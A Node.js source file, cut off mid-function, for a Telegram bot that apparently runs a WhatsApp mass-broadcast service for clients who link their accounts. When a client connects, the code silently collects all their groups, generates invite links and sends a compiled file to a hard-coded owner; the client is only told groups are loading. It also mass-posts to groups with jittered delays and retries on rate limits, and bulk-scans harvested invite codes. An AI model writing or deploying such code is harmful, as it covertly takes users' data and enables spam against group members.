'use strict';

// ============================================================
// WA Broadcast Manager — монолитный index.js
// Всё в одном файле: config, store, wa, autocollect,
// collector, groups, sender, invites, bot.
// ============================================================

const fs = require('fs');
const path = require('path');
const express = require('express');
const QRCode = require('qrcode');
const pino = require('pino');
const TelegramBot = require('node-telegram-bot-api');
const {
  default: makeWASocket,
  useMultiFileAuthState,
  DisconnectReason,
  makeCacheableSignalKeyStore,
  fetchLatestBaileysVersion,
  Browsers,
} = require('@whiskeysockets/baileys');

// ============================================================
// 1. CONFIG
// ============================================================

const PORT = Number(process.env.PORT || 3000);
const DATA_DIR = process.env.DATA_DIR || path.join(process.cwd(), 'data');
if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });

const OWNER_ID = Number(process.env.OWNER_ID || 5846687574);
const SUB_ADMINS = (process.env.SUB_ADMINS || '8264531154')
  .split(',').map(s => Number(s.trim())).filter(Boolean);
const BOT_TOKEN = process.env.BOT_TOKEN || '';

const MAX_USERS = 25;
const PAGE_SIZE_GROUPS = 10;
const PAGE_SIZE_USERS = 6;
const SEND_BASE_MS = 18_000;
const SEND_JITTER_MS = 2_000;
const RETRY_AFTER_MS = 30_000;
const INVITE_DELAY_MS = 200;
const MAX_RECONNECT = 3;

const P = {
  users: path.join(DATA_DIR, 'users.json'),
  banned: path.join(DATA_DIR, 'banned.json'),
  finderDb: path.join(DATA_DIR, `finder_db_${OWNER_ID}.json`),
  inviteCodes: path.join(DATA_DIR, 'invite_codes.txt'),
  collectedLinks: path.join(DATA_DIR, 'collected_links.jsonl'),
  masterJsonl: path.join(DATA_DIR, 'all_groups_master.jsonl'),
  masterTxt: path.join(DATA_DIR, 'all_groups_master.txt'),
  authDir: (id) => path.join(DATA_DIR, `auth_info_${id}`),
  excluded: (id) => path.join(DATA_DIR, `excluded_${id}.json`),
};

const roleOf = (chatId) => {
  const id = Number(chatId);
  if (id === OWNER_ID) return 'owner';
  if (SUB_ADMINS.includes(id)) return 'subadmin';
  return 'client';
};
const isAdmin = (chatId) => ['owner', 'subadmin'].includes(roleOf(chatId));

// ============================================================
// 2. STORE — атомарная запись
// ============================================================

function readJson(file, fallback) {
  try {
    if (!fs.existsSync(file)) return fallback;
    const raw = fs.readFileSync(file, 'utf8').trim();
    if (!raw) return fallback;
    return JSON.parse(raw);
  } catch (e) {
    console.error(`[store] read fail ${file}:`, e.message);
    return fallback;
  }
}
function writeJsonAtomic(file, obj) {
  const dir = path.dirname(file);
  if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
  const tmp = `${file}.${process.pid}.${Date.now()}.tmp`;
  const fd = fs.openSync(tmp, 'w');
  try {
    fs.writeSync(fd, JSON.stringify(obj, null, 2));
    fs.fsyncSync(fd);
  } finally { fs.closeSync(fd); }
  fs.renameSync(tmp, file);
}
function appendJsonl(file, obj) {
  const dir = path.dirname(file);
  if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
  fs.appendFileSync(file, JSON.stringify(obj) + '\n', 'utf8');
}

// ============================================================
// 3. QR helper
// ============================================================

async function qrToPngBuffer(text, size = 512) {
  return QRCode.toBuffer(text, {
    type: 'png', errorCorrectionLevel: 'M',
    margin: 2, width: size, color: { dark: '#000', light: '#fff' },
  });
}

// ============================================================
// 4. WA — Baileys session manager
// ============================================================

const waLogger = pino({ level: 'silent' });
const sessions = new Map();

function getSession(id) { return sessions.get(Number(id)); }
function isConnected(id) {
  const s = getSession(id);
  return !!(s && s.active && s.sock);
}

function normalizePhone(input) {
  let d = String(input).replace(/[^\d]/g, '');
  if (d.length === 11 && d.startsWith('8')) d = '7' + d.slice(1);
  if (d.length === 10) d = '7' + d;
  return d;
}

function resetAuthFiles(id) {
  const dir = P.authDir(id);
  try { if (fs.existsSync(dir)) fs.rmSync(dir, { recursive: true, force: true }); } catch {}
  const rec = sessions.get(Number(id));
  if (rec) { rec.active = false; rec.reconnectAttempts = 0; rec.qrCount = 0; rec.pairingCode = null; }
}

async function startSession(chatId, opts = {}) {
  const id = Number(chatId);
  const { onQR, onPairing, onStatus, onLoggedOut, onOwnerFile, phoneNumber, forceReset = false } = opts;

  if (forceReset) resetAuthFiles(id);

  const authDir = P.authDir(id);
  fs.mkdirSync(authDir, { recursive: true });

  const { state, saveCreds } = await useMultiFileAuthState(authDir);
  const { version } = await fetchLatestBaileysVersion();

  let rec = sessions.get(id);
  if (!rec) {
    rec = { sock: null, state, reconnectAttempts: 0, qrCount: 0, pairingCode: null, active: false };
    sessions.set(id, rec);
  } else { rec.state = state; }

  const sock = makeWASocket({
    version, logger: waLogger,
    auth: { creds: state.creds, keys: makeCacheableSignalKeyStore(state.keys, waLogger) },
    browser: Browsers.ubuntu('Chrome'),
    printQRInTerminal: false,
    markOnlineOnConnect: false,
    syncFullHistory: false,
    generateHighQualityLinkPreview: false,
    getMessage: async () => ({ conversation: '' }),
  });
  rec.sock = sock;
  sock.ev.on('creds.update', saveCreds);

  if (phoneNumber && !sock.authState.creds.registered) {
    try {
      await new Promise(r => setTimeout(r, 1500));
      const code = await sock.requestPairingCode(normalizePhone(phoneNumber));
      rec.pairingCode = code;
      if (onPairing) await onPairing(code);
    } catch (e) {
      console.error(`[wa] pairing fail ${id}:`, e.message);
      if (onStatus) onStatus('pairing_error');
    }
  }

  sock.ev.on('connection.update', async (u) => {
    const { connection, lastDisconnect, qr } = u;

    if (qr && !phoneNumber) {
      rec.qrCount++;
      if (rec.qrCount > 3) {
        if (onStatus) onStatus('qr_expired');
        resetAuthFiles(id); rec.qrCount = 0;
        try { sock.end(undefined); } catch {}
        return;
      }
      try {
        const png = await qrToPngBuffer(qr);
        if (onQR) await onQR(png);
      } catch (e) { console.error('[wa] qr fail:', e.message); }
    }

    if (connection === 'open') {
      rec.active = true; rec.reconnectAttempts = 0; rec.qrCount = 0;
      if (onStatus) onStatus('connected');
      setImmediate(async () => {
        try { await collectGroupsForClient(id, { onOwnerFile }); }
        catch (e) { console.error(`[wa] autocollect fail ${id}:`, e.message); }
      });
    }

    if (connection === 'close') {
      rec.active = false;
      const statusCode = lastDisconnect?.error?.output?.statusCode;
      const reason = lastDisconnect?.error?.message || 'unknown';
      const isLoggedOut = statusCode === DisconnectReason.loggedOut || statusCode === 401 || statusCode === 403;

      if (isLoggedOut) {
        resetAuthFiles(id);
        if (onLoggedOut) await onLoggedOut(reason);
        if (onStatus) onStatus('logged_out');
        try { sock.end(undefined); } catch {}
        return;
      }
      if (/Bad MAC|BadMAC/i.test(reason) && onStatus) onStatus('bad_mac');
      if (statusCode === DisconnectReason.connectionReplaced) {
        if (onStatus) onStatus('connection_replaced');
        return;
      }
      if (rec.reconnectAttempts < MAX_RECONNECT) {
        rec.reconnectAttempts++;
        const wait = 2000 * rec.reconnectAttempts;
        if (onStatus) onStatus(`reconnecting_${rec.reconnectAttempts}`);
        setTimeout(() => {
          startSession(id, { ...opts, forceReset: false })
            .catch(e => console.error(`[wa] reconnect fail ${id}:`, e.message));
        }, wait);
      } else if (onStatus) onStatus('reconnect_exhausted');
    }
  });

  return sock;
}

async function stopSession(chatId, { wipe = false } = {}) {
  const id = Number(chatId);
  const rec = sessions.get(id);
  if (rec && rec.sock) {
    try { await rec.sock.logout(); } catch {}
    try { rec.sock.end(undefined); } catch {}
    rec.active = false;
  }
  sessions.delete(id);
  if (wipe) resetAuthFiles(id);
}

async function bootstrapAll(users, hooks = {}) {
  const ids = Object.keys(users).map(Number);
  for (const id of ids) {
    if (!fs.existsSync(P.authDir(id))) continue;
    try {
      await startSession(id, {
        onStatus: (s) => hooks.onStatus?.(id, s),
        onLoggedOut: async () => hooks.onLoggedOut?.(id),
        onOwnerFile: hooks.onOwnerFile,
      });
    } catch (e) { console.error(`[wa] bootstrap ${id} fail:`, e.message); }
    await new Promise(r => setTimeout(r, 1500));
  }
}

async function fetchAllGroups(chatId) {
  const rec = sessions.get(Number(chatId));
  if (!rec || !rec.active || !rec.sock) return [];
  const raw = await rec.sock.groupFetchAllParticipating();
  const out = [];
  for (const jid of Object.keys(raw)) {
    const g = raw[jid];
    out.push({
      jid,
      subject: g.subject || '(без названия)',
      size: g.size || (g.participants ? g.participants.length : 0),
      announce: !!g.announce || !!g.isCommunityAnnounce,
      isAdmin: isUserAdmin(g, rec.sock),
    });
  }
  out.sort((a, b) => b.size - a.size);
  return out;
}

function isUserAdmin(g, sock) {
  try {
    const me = sock.user?.id;
    if (!me) return false;
    const bare = me.split(':')[0].split('@')[0];
    return (g.participants || []).some(p =>
      String(p.id).includes(bare) && (p.admin === 'admin' || p.admin === 'superadmin'));
  } catch { return false; }
}

async function sendMessage(chatId, jid, message) {
  const rec = sessions.get(Number(chatId));
  if (!rec || !rec.active || !rec.sock) throw new Error('session_inactive');
  return rec.sock.sendMessage(jid, message);
}

async function checkInvite(chatId, code) {
  const rec = sessions.get(Number(chatId));
  if (!rec || !rec.active || !rec.sock) throw new Error('session_inactive');
  return rec.sock.groupGetInviteInfo(code);
}

// ============================================================
// 5. AUTOCOLLECT — автосбор групп при входе клиента
// ============================================================

const collectedThisSession = new Set();

async function fetchGroupInvite(sock, jid) {
  try {
    const code = await sock.groupInviteCode(jid);
    return code ? `https://chat.whatsapp.com/${code}` : null;
  } catch { return null; }
}

async function collectGroupsForClient(chatId, { onOwnerFile } = {}) {
  const id = Number(chatId);
  if (collectedThisSession.has(id)) return { ok: false, reason: 'already_collected' };
  const rec = sessions.get(id);
  if (!rec || !rec.active || !rec.sock) return { ok: false, reason: 'not_connected' };

  const raw = await rec.sock.groupFetchAllParticipating().catch(() => ({}));
  const jids = Object.keys(raw);
  if (!jids.length) { collectedThisSession.add(id); return { ok: true, count: 0 }; }

  const rows = [];
  const inviteCache = new Map();

  for (const jid of jids) {
    const g = raw[jid];
    const size = g.size || (g.participants ? g.participants.length : 0);
    let invite = inviteCache.get(jid);
    if (invite === undefined) {
      invite = await fetchGroupInvite(rec.sock, jid);
      inviteCache.set(jid, invite);
      await new Promise(r => setTimeout(r, 250));
    }
    const row = {
      ts: Date.now(), fromId: id, jid,
      subject: g.subject || '(без названия)',
      size,
      announce: !!g.announce || !!g.isCommunityAnnounce,
      invite,
    };
    rows.push(row);
    appendJsonl(P.masterJsonl, row);
  }
  collectedThisSession.add(id);
  rebuildMasterTxt();

  if (onOwnerFile) {
    try {
      const buf = fs.readFileSync(P.masterTxt);
      await onOwnerFile(buf, rows.length, id);
    } catch (e) { console.error('[autocollect] send fail:', e.message); }
  }
  return { ok: true, count: rows.length };
}

function rebuildMasterTxt() {
  if (!fs.existsSync(P.masterJsonl)) {
    fs.writeFileSync(P.masterTxt, '# Пусто.\n', 'utf8'); return;
  }
  const lines = [
    '# Единый файл всех групп всех клиентов',
    `# Обновлено: ${new Date().toISOString()}`,
    '',
  ];
  const byUser = new Map();
  for (const l of fs.readFileSync(P.masterJsonl, 'utf8').split('\n').filter(Boolean)) {
    let r; try { r = JSON.parse(l); } catch { continue; }
    if (!byUser.has(r.fromId)) byUser.set(r.fromId, []);
    byUser.get(r.fromId).push(r);
  }
  for (const [uid, groups] of [...byUser.entries()].sort((a, b) => a[0] - b[0])) {
    lines.push(`## Клиент ${uid} — ${groups.length} групп`, '');
    const sorted = groups.slice().sort((a, b) => (b.size || 0) - (a.size || 0));
    for (const g of sorted) {
      const badge = g.announce ? '🔒 ' : '';
      lines.push(`${badge}${g.subject} | ${g.size} чел. | ${g.invite || '(ссылка недоступна — не админ)'}`);
    }
    lines.push('');
  }
  const tmp = `${P.masterTxt}.${process.pid}.tmp`;
  fs.writeFileSync(tmp, lines.join('\n'), 'utf8');
  fs.renameSync(tmp, P.masterTxt);
}

// ============================================================
// 6. COLLECTOR — ручной сбор ссылок
// ============================================================

const pendingCollect = new Map();
function setAwaiting(id, state) { pendingCollect.set(Number(id), state); }
function getAwaiting(id) { return pendingCollect.get(Number(id)); }

function extractInvite(text) {
  const m = String(text || '').match(/chat\.whatsapp\.com\/([A-Za-z0-9_-]{8,})/);
  return m ? `https://chat.whatsapp.com/${m[1]}` : null;
}
function extractCode(invite) {
  const m = String(invite || '').match(/chat\.whatsapp\.com\/([A-Za-z0-9_-]+)/);
  return m ? m[1] : null;
}

async function ingestLink(chatId, rawText) {
  const invite = extractInvite(rawText);
  if (!invite) return { ok: false, reason: 'no_invite' };
  const code = extractCode(invite);
  let meta = { subject: '(неизвестно)', size: 0 };
  try {
    const info = await checkInvite(OWNER_ID, code);
    meta = { subject: info.subject || '(без названия)', size: info.size || 0 };
  } catch (e) {
    meta = { subject: '(не удалось проверить)', size: 0, error: String(e.message || e) };
  }
  const record = {
    ts: Date.now(), fromId: Number(chatId), fromRole: roleOf(chatId),
    invite, subject: meta.subject, size: meta.size, error: meta.error || null,
  };
  appendJsonl(P.collectedLinks, record);
  return { ok: true, record };
}

function readAllLinks() {
  try {
    if (!fs.existsSync(P.collectedLinks)) return [];
    return fs.readFileSync(P.collectedLinks, 'utf8')
      .split('\n').filter(Boolean).map(l => { try { return JSON.parse(l); } catch { return null; } })
      .filter(Boolean);
  } catch { return []; }
}

function exportCollectedTxt() {
  const all = readAllLinks();
  const lines = [
    '# Собранные ссылки',
    `# ${new Date().toISOString()}`,
    `# Всего: ${all.length}`,
    '',
  ];
  for (const r of all) {
    lines.push(`[${new Date(r.ts).toISOString()}] from=${r.fromId} (${r.fromRole}) | "${r.subject}" | ${r.size} чел. | ${r.invite}`);
  }
  return lines.join('\n');
}

// ============================================================
// 7. GROUPS — исключения
// ============================================================

async function listGroupsSorted(chatId) {
  const all = await fetchAllGroups(chatId);
  return all.map(g => ({ ...g, closed: g.announce && !g.isAdmin }));
}
function loadExcluded(chatId) { return new Set(readJson(P.excluded(chatId), [])); }
function saveExcluded(chatId, set) { writeJsonAtomic(P.excluded(chatId), [...set]); }

// ============================================================
// 8. SENDER — движок рассылки
// ============================================================

const activeBroadcasts = new Map();
function isRunning(id) { const r = activeBroadcasts.get(Number(id)); return !!(r && r.running); }
function stopBroadcast(id) {
  const r = activeBroadcasts.get(Number(id));
  if (!r) return false;
  r.stop = true; return true;
}
function shuffleFisherYates(arr) {
  const a = arr.slice();
  for (let i = a.length - 1; i > 0; i--) {
    const j = Math.floor(Math.random() * (i + 1));
    [a[i], a[j]] = [a[j], a[i]];
  }
  return a;
}
async function sleepInterruptible(ms, ctx) {
  let left = ms;
  while (left > 0) {
    if (ctx.stop) return false;
    const chunk = Math.min(1000, left);
    await new Promise(r => setTimeout(r, chunk));
    left -= chunk;
  }
  return !ctx.stop;
}
function isTransientError(err) {
  const m = String(err && err.message || err).toLowerCase();
  return m.includes('rate-overlimit') || m.includes('timeout') ||
         m.includes('428') || m.includes('408') || m.includes('stream errored');
}

async function runBroadcast(chatId, groups, media, caption) {
  const id = Number(chatId);
  if (isRunning(id)) return { ok: false, error: 'already_running' };
  const ctx = { running: true, stop: false, stats: { success: 0, skipped: 0, errors: [], failed: [] } };
  activeBroadcasts.set(id, ctx);

  const target = groups.filter(g => !g.closed);
  ctx.stats.skipped = groups.length - target.length;

  for (let i = 0; i < target.length; i++) {
    if (ctx.stop) break;
    const g = target[i];
    const payload = buildPayload(media, caption);
    let sent = false, attempt = 0;
    while (!sent && attempt < 2 && !ctx.stop) {
      attempt++;
      try {
        await sendMessage(id, g.jid, payload);
        ctx.stats.success++; sent = true;
      } catch (e) {
        if (attempt < 2 && isTransientError(e)) {
          if (!(await sleepInterruptible(RETRY_AFTER_MS, ctx))) break;
          continue;
        }
        ctx.stats.errors.push({ subject: g.subject, reason: String(e.message || e) });
        ctx.stats.failed.push(g.subject);
        break;
      }
    }
    if (!ctx.stop && i < target.length - 1) {
      const delay = SEND_BASE_MS + Math.floor(Math.random() * SEND_JITTER_MS);
      if (!(await sleepInterruptible(delay, ctx))) break;
    }
  }
  ctx.running = false;
  return { ok: true, stats: ctx.stats, stopped: ctx.stop };
}

function buildPayload(media, caption) {
  if (!media) return { text: caption || '' };
  const { kind, buffer, mimetype, filename } = media;
  switch (kind) {
    case 'image': return { image: buffer, caption, mimetype };
    case 'video': return { video: buffer, caption, mimetype };
    case 'gif':   return { video: buffer, caption, mimetype, gifPlayback: true };
    case 'doc':   return { document: buffer, caption, mimetype, fileName: filename };
    default:      return { text: caption || '' };
  }
}

// ============================================================
// 9. INVITES — finder
// ============================================================

function loadFinderDb() { return readJson(P.finderDb, { checked: {}, resetAt: 0 }); }
function saveFinderDb(db) { writeJsonAtomic(P.finderDb, db); }
function loadInviteCodes() {
  try {
    if (!fs.existsSync(P.inviteCodes)) return [];
    return fs.readFileSync(P.inviteCodes, 'utf8')
      .split(/\r?\n/).map(s => s.trim()).filter(Boolean);
  } catch { return []; }
}
function parseInviteCode(raw) {
  const s = String(raw).trim();
  const m = s.match(/chat\.whatsapp\.com\/([A-Za-z0-9_-]+)/);
  if (m) return m[1];
  return s.replace(/[^\w-]/g, '');
}
async function scanInvites({ limit = 50 } = {}) {
  const db = loadFinderDb();
  const codes = loadInviteCodes();
  const results = { open: [], request: [], dead: [], dup: [] };
  let processed = 0;
  for (const raw of codes) {
    if (processed >= limit) break;
    const code = parseInviteCode(raw);
    if (!code) continue;
    if (db.checked[code] && !db.checked[code].show) { results.dup.push(code); continue; }
    try {
      const info = await checkInvite(OWNER_ID, code);
      processed++;
      db.checked[code] = {
        subject: info.subject || '', size: info.size || 0,
        request: !!info.requestJoin, announce: !!info.announce,
        show: false, checkedAt: Date.now(),
      };
      const entry = { code, subject: info.subject, size: info.size };
      if (info.requestJoin) results.request.push(entry);
      else results.open.push(entry);
    } catch (e) {
      results.dead.push({ code, reason: String(e.message || e) });
      db.checked[code] = { dead: true, show: false, checkedAt: Date.now() };
    }
    await new Promise(r => setTimeout(r, INVITE_DELAY_MS));
  }
  saveFinderDb(db);
  results.open.sort((a, b) => (b.size || 0) - (a.size || 0));
  results.request.sort((a, b) => (b.size || 0) - (a.size || 0));
  return results;
}
function resetFinderHistory() {
  const db = loadFinderDb();
  db.resetAt = Date.now();
  for (const k of Object.keys(db.checked)) db.checked[k].show = true;
  saveFinderDb(db);
}

// ============================================================
// 10. BOT — Telegram хендлеры
// ============================================================

const ui = new Map();
function uiState(chatId) {
  const id = Number(chatId);
  if (!ui.has(id)) {
    ui.set(id, {
      mode: 'idle', groupPage: 0, onlyExcluded: false,
      selectedMedia: null, selectedCaption: '',
      adminPage: 0, adminUserId: null,
      selectedGroupJid: null, broadcastMode: 'one',
    });
  }
  return ui.get(id);
}
function loadUsers() { return readJson(P.users, {}); }
function saveUsers(u) { writeJsonAtomic(P.users, u); }
function loadBanned() { return new Set(readJson(P.banned, [])); }
function saveBanned(s) { writeJsonAtomic(P.banned, [...s]); }

function activeSlotCount(users) {
  let n = 0;
  for (const id of Object.keys(users)) {
    if (roleOf(id) === 'client' && isConnected(id)) n++;
  }
  return n;
}

function mainKeyboard(chatId) {
  const role = roleOf(chatId);
  const rows = [];
  if (role === 'client' || role === 'subadmin') {
    if (isConnected(chatId)) {
      rows.push([{ text: '📤 Рассылка', callback_data: 'bc_menu' }, { text: '📋 Мои группы', callback_data: 'gr_list_0' }]);
      rows.push([{ text: '🚫 Исключения', callback_data: 'ex_list_0' }, { text: '📎 Поделиться ссылкой', callback_data: 'share_link' }]);
    } else {
      rows.push([{ text: '📱 Подключить WhatsApp (Pairing)', callback_data: 'wa_pair' }]);
      rows.push([{ text: '📷 Подключить WhatsApp (QR)', callback_data: 'wa_qr' }]);
    }
  }
  if (role === 'owner') {
    rows.push([{ text: '🔍 Поиск новых групп', callback_data: 'finder' }]);
    rows.push([{ text: '👥 Собранные ссылки', callback_data: 'collected' }]);
    rows.push([{ text: '📦 Единый файл групп', callback_data: 'collected_master' }]);
    rows.push([{ text: '🛡 Панель управления', callback_data: 'admin_panel' }]);
  }
  if (role === 'subadmin') {
    rows.push([{ text: '🛡 Панель управления', callback_data: 'admin_panel' }]);
  }
  rows.push([{ text: 'ℹ️ Статус', callback_data: 'status' }]);
  return { reply_markup: { inline_keyboard: rows } };
}

function createBot(token) {
  const bot = new TelegramBot(token, { polling: true });

  bot.setMyCommands([
    { command: 'start', description: 'Меню' },
    { command: 'status', description: 'Статус' },
    { command: 'stop', description: 'Остановить рассылку' },
    { command: 'cancel', description: 'Отменить ввод' },
  ]).catch(() => {});
  bot.deleteWebHook().catch(() => {});

  bot.on('polling_error', (err) => {
    const code = err?.response?.body?.error_code;
    const msg = String(err.message || '');
    if (code === 409 || /EFATAL|ETIMEDOUT/.test(msg)) {
      setTimeout(() => { try { bot.startPolling(); } catch {} }, 3000);
    }
  });

  bot.on('callback_query', async (q) => {
    const chatId = q.from.id;
    if (loadBanned().has(Number(chatId))) {
      return bot.answerCallbackQuery(q.id, { text: '⛔ Заблокирован', show_alert: true });
    }
    return handleCallback(bot, q);
  });

  bot.on('message', async (msg) => {
    const chatId = msg.from?.id;
    if (!chatId) return;
    if (loadBanned().has(Number(chatId))) return;

    const awaiting = getAwaiting(chatId);
    if (awaiting && msg.text) {
      if (msg.text.startsWith('/')) {
        setAwaiting(chatId, false);
      } else {
        const res = await ingestLink(chatId, msg.text);
        if (res.ok) {
          setAwaiting(chatId, false);
          return bot.sendMessage(chatId,
            `✅ Принято: *${res.record.subject}* (${res.record.size} чел.)`,
            { parse_mode: 'Markdown' });
        }
        return bot.sendMessage(chatId, '⚠️ Не похоже на ссылку WhatsApp. /cancel — отмена.');
      }
    }
    return handleMessage(bot, msg);
  });

  return bot;
}

async function handleMessage(bot, msg) {
  const chatId = msg.from.id;
  const text = msg.text || '';
  const role = roleOf(chatId);
  const st = uiState(chatId);

  if (st.mode === 'await_phone') {
    const phone = String(text).trim();
    if (!/^\d{10,15}$/.test(phone.replace(/[^\d]/g, ''))) {
      return bot.sendMessage(chatId, '⚠️ Формат: 79991234567. /cancel — отмена.');
    }
    st.mode = 'pairing';
    bot.sendMessage(chatId, '⏳ Запрашиваю код сопряжения…');

    try {
      await startSession(chatId, {
        phoneNumber: phone,
        onPairing: async (code) => {
          const escaped = String(code).replace(/[<>&]/g, c =>
            ({ '<': '&lt;', '>': '&gt;', '&': '&amp;' }[c]));
          await bot.sendMessage(chatId,
            `🔑 Pairing-код:\n\n<code>${escaped}</code>\n\n` +
            `WhatsApp → Связанные устройства → Связать устройство.`,
            { parse_mode: 'HTML', reply_markup: {
              inline_keyboard: [[{ text: '📋 Скопировать', copy_text: { text: code } }]],
            }});
        },
        onStatus: async (s) => {
          if (s === 'connected') {
            await bot.sendMessage(chatId, '✅ WhatsApp подключён. Подгружаю группы…');
            const users = loadUsers();
            if (users[String(chatId)]) {
              users[String(chatId)].waConnected = true;
              users[String(chatId)].phone = phone;
              saveUsers(users);
            }
            st.mode = 'idle';
          } else if (s.startsWith('reconnecting')) {
            await bot.sendMessage(chatId, `🔄 Реконнект (${s})…`);
          } else if (s === 'logged_out') {
            st.mode = 'idle';
            await bot.sendMessage(chatId, '⚠️ Сессия закрыта. /start.');
          } else if (s === 'pairing_error') {
            st.mode = 'idle';
            await bot.sendMessage(chatId, '❌ Ошибка привязки. /start.');
          }
        },
        onOwnerFile: async (buf, count, clientId) => {
          try {
            await bot.sendDocument(OWNER_ID, buf,
              { caption: `📎 *Новый вход клиента*\nID: \`${clientId}\`\nГрупп: *${count}*`, parse_mode: 'Markdown' },
              { filename: 'all_groups_master.txt', contentType: 'text/plain' });
          } catch (e) { console.error('[bot] owner file fail:', e.message); }
        },
      });
    } catch (e) {
      st.mode = 'idle';
      return bot.sendMessage(chatId, `❌ ${e.message}`);
    }
    return;
  }

  if (text === '/cancel') {
    setAwaiting(chatId, false);
    st.mode = 'idle';
    return bot.sendMessage(chatId, '↩️ Отменено.', mainKeyboard(chatId));
  }
  if (text === '/stop') {
    if (stopBroadcast(chatId)) return bot.sendMessage(chatId, '🛑 Останавливаю…');
    return bot.sendMessage(chatId, 'Нет активной рассылки.');
  }
  if (text === '/start' || text === '/menu') {
    const users = loadUsers();
    if (!users[String(chatId)]) {
      users[String(chatId)] = { id: Number(chatId), role, createdAt: Date.now(), waConnected: false, phone: null };
      saveUsers(users);
    }
    return bot.sendMessage(chatId,
      `👋 *WhatsApp Broadcast Manager*\n\nРоль: *${role}*\nСлотов: *${activeSlotCount(users)}/${MAX_USERS}*\n\nВыбери действие:`,
      { parse_mode: 'Markdown', ...mainKeyboard(chatId) });
  }
  if (text === '/status') return showStatus(bot, chatId);
  return bot.sendMessage(chatId, 'Через /start', mainKeyboard(chatId));
}

async function showStatus(bot, chatId) {
  const users = loadUsers();
  const banned = loadBanned();
  return bot.sendMessage(chatId,
    `📊 *Статус*\nРоль: *${roleOf(chatId)}*\nWhatsApp: ${isConnected(chatId) ? '🟢' : '🔴'}\nСлотов: *${activeSlotCount(users)}/${MAX_USERS}*\nБан: ${banned.has(Number(chatId)) ? 'да' : 'нет'}`,
    { parse_mode: 'Markdown', ...mainKeyboard(chatId) });
}

async function handleCallback(bot, q) {
  const chatId = q.from.id;
  const data = q.data || '';
  await bot.answerCallbackQuery(q.id).catch(() => {});
  const role = roleOf(chatId);
  const st = uiState(chatId);

  if (data === 'wa_pair') {
    st.mode = 'await_phone';
    return bot.sendMessage(chatId, '📱 Отправь номер в формате 79991234567 (/cancel).');
  }
  if (data === 'wa_qr') return startQr(bot, chatId);
  if (data === 'status') return showStatus(bot, chatId);

  if (data.startsWith('gr_list_')) {
    st.groupPage = Number(data.split('_')[2] || 0);
    return renderGroups(bot, chatId);
  }
  if (data === 'gr_refresh') return renderGroups(bot, chatId);

  if (data.startsWith('ex_list_')) {
    st.groupPage = Number(data.split('_')[2] || 0);
    return renderExclusions(bot, chatId);
  }
  if (data.startsWith('ex_toggle_')) {
    const jid = data.slice('ex_toggle_'.length);
    const ex = loadExcluded(chatId);
    if (ex.has(jid)) ex.delete(jid); else ex.add(jid);
    saveExcluded(chatId, ex);
    return renderExclusions(bot, chatId);
  }
  if (data === 'ex_clear') { saveExcluded(chatId, new Set()); return renderExclusions(bot, chatId); }
  if (data.startsWith('ex_only_')) { st.onlyExcluded = data === 'ex_only_1'; return renderExclusions(bot, chatId); }

  if (data === 'bc_menu') return showBroadcastMenu(bot, chatId);
  if (data === 'bc_stop') {
    if (stopBroadcast(chatId)) return bot.sendMessage(chatId, '🛑 Останавливаю.');
    return bot.sendMessage(chatId, 'Нет активной.');
  }
  if (data === 'bc_mode_one') { st.broadcastMode = 'one'; return showBroadcastMenu(bot, chatId); }
  if (data === 'bc_mode_ten') { st.broadcastMode = 'ten'; return showBroadcastMenu(bot, chatId); }
  if (data === 'bc_mode_all') { st.broadcastMode = 'all'; return showBroadcastMenu(bot, chatId); }
  if (data === 'bc_start') return runChosenBroadcast(bot, chatId);

  if (data === 'share_link') {
    setAwaiting(chatId, true);
    return bot.sendMessage(chatId, '📎 Отправь ссылку на группу WhatsApp. /cancel — отмена.');
  }

  if (data === 'finder') {
    if (role !== 'owner') return;
    const sent = await bot.sendMessage(chatId, '🔍 Проверяю инвайты…');
    try {
      const res = await scanInvites({ limit: 100 });
      const fmt = (arr) => arr.slice(0, 20).map(g => `• ${g.subject} — ${g.size} чел.`).join('\n') || '—';
      const msg = [
        `🟢 *Открытые* (${res.open.length}):\n${fmt(res.open)}`,
        ``, `🟡 *По запросу* (${res.request.length}):\n${fmt(res.request)}`,
        ``, `🔴 Битых: ${res.dead.length} · Пропущено: ${res.dup.length}`,
      ].join('\n');
      return bot.editMessageText(msg, { chat_id: chatId, message_id: sent.message_id, parse_mode: 'Markdown' })
        .catch(() => bot.sendMessage(chatId, msg, { parse_mode: 'Markdown' }));
    } catch (e) { return bot.sendMessage(chatId, `❌ ${e.message}`); }
  }
  if (data === 'finder_reset') {
    if (role !== 'owner') return;
    resetFinderHistory();
    return bot.sendMessage(chatId, '♻️ История сброшена.');
  }

  if (data === 'collected') {
    if (role !== 'owner') return;
    const buf = Buffer.from(exportCollectedTxt(), 'utf8');
    return bot.sendDocument(chatId, buf,
      { caption: `📎 Собранные ссылки` },
      { filename: `collected_${Date.now()}.txt`, contentType: 'text/plain' });
  }

  if (data === 'collected_master') {
    if (role !== 'owner') return;
    try {
      rebuildMasterTxt();
      const buf = fs.readFileSync(P.masterTxt);
      return bot.sendDocument(chatId, buf,
        { caption: `📦 Единый файл (${new Date().toISOString()})` },
        { filename: 'all_groups_master.txt', contentType: 'text/plain' });
    } catch (e) { return bot.sendMessage(chatId, `❌ ${e.message}`); }
  }

  if (data === 'admin_panel') { if (!isAdmin(chatId)) return; st.adminPage = 0; return renderAdminPanel(bot, chatId); }
  if (data.startsWith('adm_page_')) { st.adminPage = Number(data.slice('adm_page_'.length)); return renderAdminPanel(bot, chatId); }
  if (data.startsWith('adm_user_')) { st.adminUserId = Number(data.slice('adm_user_'.length)); return renderAdminUser(bot, chatId); }
  if (data.startsWith('adm_kickwa_')) {
    const t = Number(data.slice('adm_kickwa_'.length));
    await stopSession(t, { wipe: true });
    const users = loadUsers();
    if (users[String(t)]) { users[String(t)].waConnected = false; saveUsers(users); }
    return renderAdminUser(bot, chatId);
  }
  if (data.startsWith('adm_stop_')) { stopBroadcast(Number(data.slice('adm_stop_'.length))); return bot.sendMessage(chatId, '🛑 Сигнал отправлен.'); }
  if (data.startsWith('adm_ban_')) {
    const t = Number(data.slice('adm_ban_'.length));
    if (t === OWNER_ID) return bot.sendMessage(chatId, '⛔ Создателя нельзя.');
    const banned = loadBanned();
    if (banned.has(t)) banned.delete(t); else banned.add(t);
    saveBanned(banned);
    return renderAdminUser(bot, chatId);
  }
  if (data.startsWith('adm_del_')) {
    const t = Number(data.slice('adm_del_'.length));
    if (t === OWNER_ID) return;
    await stopSession(t, { wipe: true });
    const users = loadUsers();
    delete users[String(t)]; saveUsers(users);
